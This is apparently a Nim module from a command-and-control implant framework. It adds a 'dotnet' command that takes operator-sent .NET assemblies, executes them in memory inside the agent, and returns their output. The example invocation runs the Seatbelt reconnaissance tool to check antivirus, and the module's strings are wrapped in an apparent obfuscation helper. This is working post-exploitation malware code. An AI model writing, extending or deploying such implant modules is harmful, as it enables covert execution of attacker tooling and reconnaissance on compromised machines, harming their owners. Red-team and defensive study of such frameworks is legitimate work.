import ../common/[types, utils]

# Define function prototype
proc executeAssembly(ctx: AgentCtx, task: Task): TaskResult 

# Module definition
let module* = Module(
    name: protect("dotnet"), 
    description: protect("Load and execute .NET assemblies in memory."),
    moduleType: MODULE_DOTNET,
    commands: @[
        Command(
            name: protect("dotnet"),
            commandType: CMD_DOTNET,
            description: protect("Execute a .NET assembly in memory and retrieve the output."),
            example: protect("dotnet /path/to/Seatbelt.exe antivirus"),
            arguments: @[
                Argument(name: protect("path"), description: protect("Path to the .NET assembly file to execute."), argumentType: BINARY, isRequired: true),
                Argument(name: protect("arguments"), description: protect("Arguments to be passed to the assembly. Arguments are handled as STRING"), argumentType: STRING, isRequired: false)
            ],
            execute: executeAssembly
        )
    ]
)

# Implement execution functions
when not defined(agent):
    proc executeAssembly(ctx: AgentCtx, task: Task): TaskResult = nil

when defined(agent):

    import strformat
    import ../agent/core/clr
    import ../agent/utils/io
    import ../agent/protocol/result
    import ../common/serialize
    
    proc executeAssembly(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            var 
                assembly: seq[byte] 
                arguments: seq[string]

            # Parse arguments 
            case int(task.argCount): 
            of 1: # Only the assembly has been passed as an argument
                assembly = task.args[0].data
                arguments = @[]
            else: # Parameters were passed to the BOF execution
                assembly = task.args[0].data
                for arg in task.args[1..^1]: 
                    arguments.add(Bytes.toString(arg.data))
            
            # Unpacking assembly file, since it contains the file name too.
            var unpacker = Unpacker.init(Bytes.toString(assembly))
            let 
                fileName = unpacker.getDataWithLengthPrefix()
                assemblyBytes = unpacker.getDataWithLengthPrefix()

            print fmt"   [>] Executing .NET assembly {fileName}."
            let (assemblyInfo, output) = dotnetInlineExecuteGetOutput(string.toBytes(assemblyBytes), arguments)

            if output != "":
                return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(assemblyInfo & "\n" & output))
            else: 
                return createTaskResult(task, STATUS_FAILED, RESULT_NO_OUTPUT, @[])

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
